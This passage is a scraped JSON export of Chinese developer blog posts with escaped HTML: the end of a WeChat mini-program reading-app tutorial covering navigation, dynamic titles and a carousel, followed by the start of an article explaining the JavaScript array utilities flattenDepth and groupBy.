src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56ca5a836d6f?w=442\u0026amp;h=554\u0026amp;f=gif\u0026amp;s=2324976\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e分类\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a5727c400afe2?w=442\u0026amp;h=554\u0026amp;f=gif\u0026amp;s=961345\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在这里分类页面的数据更整齐一些，就以它为例来说一说我是如何通过id来动态选择数据的。首先要清楚的是stack分类页面和跳转到的booklist详情页。在这里是通过navigator来跳转的，我们在url中设置表达式来动态获取id，url=\"booklist/booklist?id={{index}}\"，然后在 booklist.js 中，通过获取到的id，进行数据的选择。\u003c/p\u003e\n\u003cp\u003estack:\u003c/p\u003e\n\u003cp\u003estack.wxml\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs \u003cview\u003e\" lang=\"\u003cview\u003e\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;view\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;view\u0026nbsp;class=\"page-search\"\u0026gt;\u0026lt;/view\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;scroll-view\u0026nbsp;wx:for=\"{{stack}}\"\u0026nbsp;wx:key=\"{{index}}\"\u0026nbsp;scroll-y=\"true\"\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;navigator\u0026nbsp;class=\"stack-view\u0026nbsp;\"\u0026nbsp;url=\"booklist/booklist?id={{index}}\"\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;image\u0026nbsp;src=\"{{item.typeCover}}\"\u0026nbsp;class=\"stack-image\"\u0026gt;\u0026lt;/image\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;text\u0026nbsp;class=\"stack-name\"\u0026gt;{{item.bookTypes}}\u0026lt;/text\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;text\u0026nbsp;class=\"stack-numb\"\u0026gt;{{item.bookNumb}}\u0026nbsp;\u0026gt;\u0026lt;/text\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/navigator\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;view\u0026nbsp;class=\"line\"\u0026gt;\u0026lt;/view\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/scroll-view\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/view\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/view\u0026gt;\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003estack.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e      Page({\n\u0009  data: {\n\u0009    stack:[],\n\u0009    id: \"\"\n\u0009  }, \n\u0009  onLoad: function () {\n\u0009      var that = this;\n\u0009\u0009wx.request({\n\u0009\u0009 \u0026nbsp;url:\"https://www.easy-mock.com/mock/5a23a9a2ff38a436c591b6fa/getArticInfo\",\n\u0009\u0009  success: function(res) {\n\u0009\u0009    console.log(res.data.data.stack);\n\u0009\u0009    console.log(res.data.data.List);              \n\u0009\u0009    that.setData({\n\u0009\u0009      stack: res.data.data.stack,\n\u0009\u0009      id: res.data.data.List\n\u0009\u0009    })\n\u0009\u0009  }\n\u0009\u0009})\n\u0009      },   \n\u0009})\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ebooklist:\u003c/p\u003e\n\u003cp\u003ebooklist.wxml\n \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;view\u0026gt;\n\u0009  \u0026lt;view\u0026gt;\n\u0009      \u0026lt;view wx:for=\"{{bookList}}\" wx:key=\"{{index}}\"\u0026gt;\n\u0009\u0009  \u0026lt;view class=\"book-list-root\" bindtap=\"bindViewTap\"\u0026gt;  \n\u0009\u0009      \u0026lt;view class=\"book-list-child\"\u0026gt;\n\u0009\u0009\u0009  \u0026lt;view\u0026gt;\n\u0009\u0009\u0009      \u0026lt;text class=\"book-list-name\"\u0026gt;{{item.bookName}}\u0026lt;/text\u0026gt;\n\u0009\u0009\u0009  \u0026lt;/view\u0026gt;\n\u0009\u0009\u0009  \u0026lt;view\u0026gt;\n\u0009\u0009\u0009      \u0026lt;text class=\"book-list-autor\"\u0026gt;{{item.authorName}}\u0026lt;/text\u0026gt;\n\u0009\u0009\u0009  \u0026lt;/view\u0026gt;\n\u0009\u0009\u0009  \u0026lt;view class=\"book-list-des\"\u0026gt;\n\u0009\u0009\u0009      \u0026lt;text\u0026gt;{{item.bookDes}}\u0026lt;/text\u0026gt;\n\u0009\u0009\u0009  \u0026lt;/view\u0026gt;\n\u0009\u0009      \u0026lt;/view\u0026gt;\n\u0009\u0009  \u0026lt;/view\u0026gt;\n\u0009\u0009  \u0026lt;view class=\"line\"\u0026gt;\u0026lt;/view\u0026gt;            \n\u0009      \u0026lt;/view\u0026gt;\n\u0009  \u0026lt;/view\u0026gt;\n      \u0026lt;/view\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ebooklist.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e        Page({\n\u0009  data: {\n\u0009      bookList:[],\n\u0009      stack:[]\n\u0009    },\n\u0009  onLoad: function (params) {\n\u0009    var that = this;\n\u0009      wx.request({\n\u0009\u0009url:\"https://www.easy-mock.com/mock/5a23a9a2ff38a436c591b6fa/getArticInfo\",\n\u0009\u0009success: function(res) {\n\u0009\u0009  that.setData({\n\u0009\u0009    bookList: res.data.data.stack[params.id].List.bookList,\n\u0009\u0009  })  \n\u0009\u0009}\n\u0009      })\n\u0009      },\n\u0009  })\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e3、对navigationBarTitleText的动态修改\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56ca9d1b65a6?w=442\u0026amp;h=554\u0026amp;f=gif\u0026amp;s=275351\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在各个页面的JSON文件中，我们能够设置页面的标题，但是当我们进入不同页面需要获取不同标题时，就需要动态的进行修改。其实实现起来很简单，我们知道通过wx.setNavigationBarTitle() 方法就能够修改页面标题，然后跟第二点所述的方式一样，通过id来达到动态获取的效果。\u003c/p\u003e\n\u003cp\u003e另外要注意的是，我们要将JSON中的navigationBarTitleText设置为空，这样在跳转的过程中就不会有原始标题和修改标题之间跳转的一个效果，而是直接显示需要的标题。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e     .json\n\u0009  {\n\u0009      \"navigationBarBackgroundColor\": \"#fff\",\n\u0009      \"navigationBarTitleText\": \" \",\n\u0009      \"navigationBarTextStyle\": \"black\"\n\u0009  }\n       .js\n\u0009onLoad: function (params) {\n\u0009  var that = this;\n\u0009    wx.request({\n\u0009      url:\"https://www.easy-mock.com/mock/5a23a9a2ff38a436c591b6fa/getArticInfo\",\n\u0009      success: function(res) {\n\u0009\u0009var bTypes = res.data.data.stack[params.id].bookTypes;\n\u0009\u0009wx.setNavigationBarTitle({ \n\u0009\u0009  title: bTypes,\n\u0009\u0009},1);\n\u0009      }\n\u0009    })\n\u0009  },\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e4、两种页面跳转方式\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e（1）使用 navigator 方式\u003c/h4\u003e\n\u003cp\u003enavigator的跳转能够保留当前页面，可返回\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e    \u0026lt;navigator class=\"stack-view \" url=\"booklist/booklist?id={{index}}\"\u0026gt;\n      //  点击部位，触发即可跳转\n      \u0026lt;/navigator\u0026gt;\n\n      \u0026lt;view class=\"page__bd-items page-flex\" bindtap=\"tomyNews\"\u0026gt;\n\u0009\u0009  \u0026lt;view class=\"page-items-lt\"\u0026gt;\n\u0009\u0009      \u0026lt;image src=\"../../assets/images/mines/news.png\" /\u0026gt;\n\u0009\u0009  \u0026lt;/view\u0026gt;\n\u0009\u0009  \u0026lt;view class=\"page-items-md\"\u0026gt;我的消息\u0026lt;/view\u0026gt;\n\u0009\u0009  \u0026lt;view class=\"page-items-others\"\u0026gt;\u0026lt;/view\u0026gt;\n\u0009\u0009  \u0026lt;view class=\"page-items-ft\"\u0026gt;\u0026gt;\u0026lt;/view\u0026gt;\n      \u0026lt;/view\u0026gt;\n\n      tomyNews:function(e) {\n\u0009  wx.navigateTo({\n\u0009    url:'news/news'\n\u0009  })\n\u0009},\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e需要注意的是：程序中要求页面的层级最多只能有五层，因为这种方式保留当前页面，也就是说以这种方式跳转页面，最多只能打开5个页面。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e（2）使用 switchTab 方法\u003c/h4\u003e\n\u003cp\u003e该方法能够跳转到 tabBar 页面，并关闭其他所有非 tabBar 页面。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e    wx.switchTab({\n              url:'../leader/leader',\n              complete:function(res) {\n              }\n            })\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e5、swiper实现轮播\u003c/h3\u003e\n\u003cp\u003e通过 swiper 和 swiper-item 实现了书桌页面的轮播效果。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56ca9fc63ba9?w=442\u0026amp;h=554\u0026amp;f=gif\u0026amp;s=506082\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e这里的相关属性就直接使用了网上的图片：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a56caee3b0162?w=618\u0026amp;h=432\u0026amp;f=jpeg\u0026amp;s=16535\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;swiper class=\"swiper\" indicator-dots=\"true\" \ninterval=\"5000\" duration=\"1000\"\u0026gt;\n        \u0026lt;swiper-item\u0026gt;\n            \u0026lt;view class=\"page__bd\"\u0026gt;\n                \u0026lt;view class=\"page__bd-books center\"\u0026gt;\n                   \u0026lt;image\n                    src=\"../../assets/images/book1.png\" /\u0026gt;\n                \u0026lt;/view\u0026gt;\n                \u0026lt;view class=\"page__bt\"\u0026gt;\n                    \u0026lt;view class=\"page__bt-readings\"\u0026gt;\n                    南风知我意\u0026lt;/view\u0026gt;\n                    \u0026lt;view class=\"page__bt-items center\"\u0026gt;\n                        \u0026lt;view\u0026gt;1186人在读\u0026lt;/view\u0026gt;\n                        \u0026lt;image \n                        src=\"../../assets/images/rg.png\" /\u0026gt;\n                    \u0026lt;/view\u0026gt;\n                \u0026lt;/view\u0026gt;\n            \u0026lt;/view\u0026gt;\n        \u0026lt;/swiper-item\u0026gt;\n \u0026lt;/swiper\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中，swiper-item 可以通过 wx:for 来循环。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e总结：\u003c/h2\u003e\n\u003cp\u003e这一次的小程序开发，让我学到了很多东西。我们是为了学习而开发项目。因此在coding的时候要沉住气，不要急躁，遇到问题就及时的去查文档或者请教别人，然后多想一想实现的方法，是不是还能够通过其他办法来实现。这样在不断的思考和解决问题中，在不断的踩坑中才能让自己快速的成长起来。\u003c/p\u003e\n\u003cp\u003e另外，其实还有很多功能和细节没有处理好，这一次的分享并不代表着结束，通过不断的学习，还将不断的对项目功能进行完善和处理各种细节。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eGithub：\u003ca target=\"_blank\" href=\"https://github.com/Hwj1220/wangyi_reading\"\u003e杳杳飞花/Reading\u003c/a\u003e\u003c/h3\u003e\n\u003cpre\u003e\u003ccode\u003e        ☝想要一个star哦☺\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 class=\"heading\"\u003e欢迎一起交流学习哟 ☞ 782835831@qq.com\u003c/h3\u003e\n\u003ch3 class=\"heading\"\u003eBlog: \u003ca target=\"_blank\" href=\"https://hwj1220.github.io/\"\u003e杳杳飞花的博客\u003c/a\u003e\u003c/h3\u003e\n","buildTime":"1514894854.3337","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3dd"},"id":"5a47c365518825146b10dff9","author":{"$oid":"5a4b76338b69bb25d83da3d0"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript30秒， 从入门到放弃之Array（三）","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"把一个数组按指定深度进行摊平。 使用递归方法，对于任意级别的深度depth，每次递归depth减1。使用Array.reduce()和Array.concat()来合并元素们或者数组们。直到depth递减到1时停止递归。省略第二个参数depth时，按深度depth为1计（即单层…","content":"\u003cblockquote\u003e\n\u003cp\u003e原文链接：\u003ca target=\"_blank\" href=\"https://github.com/hongmaoxiao/myblog/issues/7\"\u003eJavaScript30秒， 从入门到放弃之Array（三）\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e水平有限，欢迎批评指正\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003eflattenDepth\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eFlattens an array up to the specified depth.\u003c/p\u003e\n\u003cp\u003eUse recursion, decrementing \u003ccode\u003edepth\u003c/code\u003e by 1 for each level of depth. Use \u003ccode\u003eArray.reduce()\u003c/code\u003e and \u003ccode\u003eArray.concat()\u003c/code\u003e to merge elements or arrays. Base case, for \u003ccode\u003edepth\u003c/code\u003e equal to \u003ccode\u003e1\u003c/code\u003e stops recursion. Omit the second element, \u003ccode\u003edepth\u003c/code\u003e to flatten only to a depth of \u003ccode\u003e1\u003c/code\u003e (single flatten).\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e flattenDepth = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, depth = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n  depth != \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n    ? arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, v\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a.concat(\u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.isArray(v) ? flattenDepth(v, depth - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) : v), [])\n    : arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, v\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a.concat(v), []);\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e把一个数组按指定深度进行摊平。\u003c/p\u003e\n\u003cp\u003e使用递归方法，对于任意级别的深度\u003ccode\u003edepth\u003c/code\u003e，每次递归\u003ccode\u003edepth\u003c/code\u003e减\u003ccode\u003e1\u003c/code\u003e。使用\u003ccode\u003eArray.reduce()\u003c/code\u003e和\u003ccode\u003eArray.concat()\u003c/code\u003e来合并元素们或者数组们。直到\u003ccode\u003edepth\u003c/code\u003e递减到\u003ccode\u003e1\u003c/code\u003e时停止递归。省略第二个参数\u003ccode\u003edepth\u003c/code\u003e时，按深度\u003ccode\u003edepth\u003c/code\u003e为\u003ccode\u003e1\u003c/code\u003e计（即单层摊平）。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat flattenDepth.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e flattenDepth = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, depth = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n    depth != \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ?\n    arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, v\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a.concat(\u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.isArray(v) ? flattenDepth(v, depth - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) : v), []) :\n    arr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, v\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a.concat(v), []);\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(flattenDepth([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, [\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e], \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e]));\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(flattenDepth([\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, [\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, [\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e]], \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e]));\n➜  code node flattenDepth.js\n[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e ]\n[ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, [ \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e ], \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e ]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e根据\u003ccode\u003edepth\u003c/code\u003e来决定处理流程，\u003cstrong\u003e若\u003ccode\u003edepth\u003c/code\u003e存在且不等于\u003ccode\u003e1\u003c/code\u003e则进行递归：\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003earr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, v\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a.concat(\u003cspan class=\"hljs-built_in\"\u003eArray\u003c/span\u003e.isArray(v) ? flattenDepth(v, depth - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) : v), [])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e用了\u003ccode\u003ereduce()\u003c/code\u003e去处理循环时的每一个值，同时用\u003ccode\u003econcat\u003c/code\u003e把所有递归结果拼接成新数组返回。循环过程中，对值进行数组判断\u003ccode\u003eArray.isArray(v)\u003c/code\u003e，是数组，\u003ccode\u003eflattenDepth(v, depth - 1)\u003c/code\u003e深度减\u003ccode\u003e1\u003c/code\u003e继续递归直到\u003ccode\u003edepth\u003c/code\u003e为\u003ccode\u003e1\u003c/code\u003e为止；不是数组，直接返回该值\u003ccode\u003ev\u003c/code\u003e，供\u003ccode\u003econcat\u003c/code\u003e拼接。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e否则，直接循环去拼接该值返回：\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003earr.reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, v\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a.concat(v), []);\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003egroupBy\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eGroups the elements of an array based on the given function.\u003c/p\u003e\n\u003cp\u003eUse \u003ccode\u003eArray.map()\u003c/code\u003e to map the values of an array to a function or property name. Use \u003ccode\u003eArray.reduce()\u003c/code\u003e to create an object, where the keys are produced from the mapped results.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e groupBy = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, func\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n arr.map(\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e func === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e ? func : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eval\u003c/span\u003e =\u0026gt;\u003c/span\u003e val[func]).reduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eacc, val, i\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n   acc[val] = (acc[val] || []).concat(arr[i]);\n   \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e acc;\n }, {});\n\u003c/code\u003e\u003c/pre\u003e\u003c/blockquote\u003e\n\u003cp\u003e按照指定的方法对数组元素进行分组归类。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eArray.map()\u003c/code\u003e对所有数组元素调用指定方法或者调用返回该元素的属性值的方法。使用\u003ccode\u003eArray.reduce()\u003c/code\u003e创建一个对象，对象的键是\u003ccode\u003emap\u003c/code\u003e生成的结果，值是符合该键的所有数组元素组成的数组。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e➜  code cat groupBy.js\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e groupBy = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003earr, func\u003c/span\u003e) =\u0026gt;\u003c/span\u003e\n    arr.map(\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e func === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e ? func : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eval\u003c/span\u003e =\u0026gt;\u003c/span\u003e val[func]).\nreduce(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eacc, val, i\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    acc[val] = (acc[val] || []).concat(arr[i]);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e acc;\n}, {});\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(groupBy([\u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e6.3\u003c/span\u003e], \u003cspan class=\"hljs-built_in\"\u003eMath\u003c/span\u003e.floor));\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(groupBy([\u003cspan class=\"hljs-string\"\u003e'one'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'two'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'three'\u003c/span\u003e], \u003cspan class=\"hljs-string\"\u003e'length'\u003c/span\u003e));\n➜  code node groupBy.js\n{ \u003cspan class=\"hljs-string\"\u003e'4'\u003c/span\u003e: [ \u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e ], \u003cspan class=\"hljs-string\"\u003e'6'\u003c/span\u003e: [ \u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e6.3\u003c/span\u003e ] }\n{ \u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e: [ \u003cspan class=\"hljs-string\"\u003e'one'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'two'\u003c/span\u003e ], \u003cspan class=\"hljs-string\"\u003e'5'\u003c/span\u003e: [ \u003cspan class=\"hljs-string\"\u003e'three'\u003c/span\u003e ] }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代码拆分：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003emap\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003earr.map(\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e func === \u003cspan class=\"hljs-string\"\u003e'function'\u003c/span\u003e ? func : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eval\u003c/span\u003e =\u0026gt;\u003c/span\u003e val[func])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对第二个参数\u003ccode\u003efunc\u003c/code\u003e的类型进行判断，若是\u003cstrong\u003efunction\u003c/strong\u003e，则对数组\u003ccode\u003earr\u003c/code\u003e所有元素调用该方法，返回一个新的数组。如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e arr = [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e];\narr.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ex\u003c/span\u003e =\u0026gt;\u003c/span\u003e x * x); \u003cspan class=\"hljs-comment\"\u003e// [1, 4, 9, 